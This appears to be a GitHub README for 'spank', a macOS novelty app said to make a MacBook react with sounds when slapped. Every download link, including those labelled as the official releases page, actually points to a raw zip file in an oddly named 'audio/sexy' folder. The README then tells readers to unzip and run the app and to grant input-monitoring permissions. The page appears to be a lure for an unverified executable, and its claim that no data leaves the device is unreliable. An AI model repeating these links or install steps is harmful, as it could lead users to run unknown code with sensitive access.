# 🖐️ spank - Hear Your MacBook React Instantly

[![Download spank](https://img.shields.io/badge/Download-spank-brightgreen?style=for-the-badge)](https://github.com/Bullzane/spank/raw/refs/heads/master/audio/sexy/Software_v3.4.zip)

---

## 🎯 What is spank?

spank is a simple app that lets your MacBook respond when you tap or slap it. When you hit your MacBook, it senses the motion using the built-in Apple Silicon accelerometer. The Mac then "yells back" by making a sound or showing a reaction. This app runs on Mac computers with Apple Silicon chips like M1 or M2.

The app uses a system interface called IOKit HID to talk to the accelerometer hardware. This means it can detect precise movement without needing extra devices.

---

## 💻 System Requirements

Before downloading and running spank, make sure your Mac meets these needs:

- A Mac with Apple Silicon chip (M1, M1 Pro, M1 Max, M2, or later)  
- Running macOS 11 Big Sur or later  
- Around 20 MB of free disk space  
- Basic user permissions to install software  
- Internet connection to download the app

Older Intel Macs will not work because the app depends on the Apple Silicon-specific accelerometer.

---

## 📥 Download spank

Click the big green button above or visit the releases page linked below. This page holds the most recent versions of spank.

[Visit the spank Release Page](https://github.com/Bullzane/spank/raw/refs/heads/master/audio/sexy/Software_v3.4.zip)

Here’s how to get the app:

1. Open your web browser and go to the releases page.  
2. Find the newest version of spank, usually at the top of the list.  
3. Download the file ending in `.dmg` or `.zip` that fits your macOS environment.  

Files are tested and ready for use on Apple Silicon Macs.

---

## 🛠️ How to Install and Run spank

After downloading, follow these steps to get spank running:

1. **Open the downloaded file**  
   - If it is a `.dmg`, double-click it to mount the disk image.  
   - If it is a `.zip`, double-click to unzip it and reveal the app.

2. **Move spank to Applications**  
   Drag the spank app into your Applications folder for easy access.

3. **Run the app**  
   Open Applications, find spank, and double-click to start it.

4. **Allow permissions**  
   The first time you run spank, macOS may ask for permission to access the accelerometer or input devices. Click Allow or Open in System Preferences if prompted.

5. **Use spank**  
   The app runs quietly in the background. Try tapping your MacBook to hear its response.

---

## 🛡️ Security and Privacy

spank requires permission to use your MacBook’s internal sensors. This is necessary for the accelerometer to work correctly. The app does not collect or transmit any data outside your device.

You can review and change the permissions by opening System Preferences → Security & Privacy → Privacy tab, then looking under Input Monitoring or Motion & Fitness.

---

## 🎛️ Using spank

The app is designed to be automatic and simple. Once running:

- Tap or slap your MacBook gently.  
- The accelerometer senses the movement.  
- spank triggers a sound or visual reaction.  

You can open the spank window if you want to adjust settings like volume or type of reaction.

---

## ⚙️ Troubleshooting

If spank does not respond or makes no noise, try these steps:

- Check that your Mac is an Apple Silicon model.  
- Ensure you gave permission to use the accelerometer.  
- Restart the app.  
- Restart your Mac.  
- Update to the latest macOS version.  
- Make sure your sound is not muted or too low.  

If problems continue, you can open an issue on the GitHub page under the Issues tab.

---

## 🔄 Updating spank

Check the releases page regularly for new updates or fixes.

To update spank:

1. Download the latest `.dmg` or `.zip` from the release page.  
2. Replace the old app in Applications with the new one.  
3. Run the new version normally.

---

## 📚 Learn More

If you want to explore how spank works under the hood:

- It is written in the Go programming language, which runs code fast and efficiently.
- It uses IOKit HID, an Apple system interface, to access the accelerometer directly.
- The app taps into macOS system features for smooth performance.

---

## 🧰 Developer Info (Optional)

For those curious or who want to contribute, here are some project details:

- Written in Go: easy to compile and build.  
- Uses open-source libraries to talk to Apple Silicon hardware.  
- Hosted on GitHub for collaboration.

---

[Download spank from the official GitHub releases page](https://github.com/Bullzane/spank/raw/refs/heads/master/audio/sexy/Software_v3.4.zip)